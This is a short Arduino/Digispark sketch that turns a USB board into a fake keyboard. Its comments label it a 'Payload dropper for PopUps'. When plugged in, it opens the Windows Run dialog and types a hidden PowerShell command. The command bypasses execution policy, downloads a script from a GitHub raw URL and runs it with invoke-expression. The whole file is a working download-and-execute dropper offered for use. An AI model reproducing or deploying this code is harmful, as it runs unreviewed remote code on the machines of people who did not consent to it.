#include "DigiKeyboard.h"
#define KEY_ESC     41
#define KEY_BACKSPACE 42
#define KEY_TAB     43
#define KEY_PRT_SCR 70
#define KEY_DELETE  76
#define KEY_ARROW_RIGHT 0x4F
#define KEY_ARROW_DOWN  0x51
#define KEY_ARROW_UP    0x52

void setup() {

DigiKeyboard.delay(5000);
DigiKeyboard.sendKeyStroke(0);

//   Payload dropper for PopUps
//   Created by d0cax
//   Enjoy
DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT | 0);
DigiKeyboard.delay(500);
DigiKeyboard.print(F("powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https://raw.githubusercontent.com/d0cax/pop-ups/main/PopUps.ps1?dl=1; invoke-expression $pl"));
DigiKeyboard.sendKeyStroke(KEY_ENTER,0);

}


void loop() {

}
